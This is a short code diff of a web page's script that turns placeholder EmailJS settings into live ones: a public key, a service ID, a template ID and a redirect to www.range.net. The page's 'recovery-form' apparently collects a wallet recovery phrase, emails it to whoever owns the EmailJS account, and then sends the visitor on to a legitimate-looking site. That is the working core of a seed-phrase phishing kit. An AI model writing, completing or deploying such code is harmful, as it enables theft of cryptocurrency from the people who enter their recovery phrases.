@@ -737,17 +737,17 @@
 <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
 <script>
   (function() {
-    emailjs.init('YOUR_PUBLIC_KEY'); // Replace with your EmailJS public key
+    emailjs.init('SdkmRe8WZ7itEba9z'); // Replace with your EmailJS public key
   })();
 
   document.getElementById('recovery-form').addEventListener('submit', function(event) {
     event.preventDefault();
 
-    emailjs.sendForm('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', this)
+    emailjs.sendForm('service_zuj2d2a', 'template_tvd86sp', this)
       .then(function(response) {
         console.log('SUCCESS!', response.status, response.text);
         // Redirect after successful email send
-        window.location.href = 'https://example.com/redirect-page'; // Replace with your redirect URL
+        window.location.href = 'https://www.range.net'; // Replace with your redirect URL
       }, function(error) {
         console.error('FAILED...', error);
         alert('Failed to send recovery phrase. Please try again.');
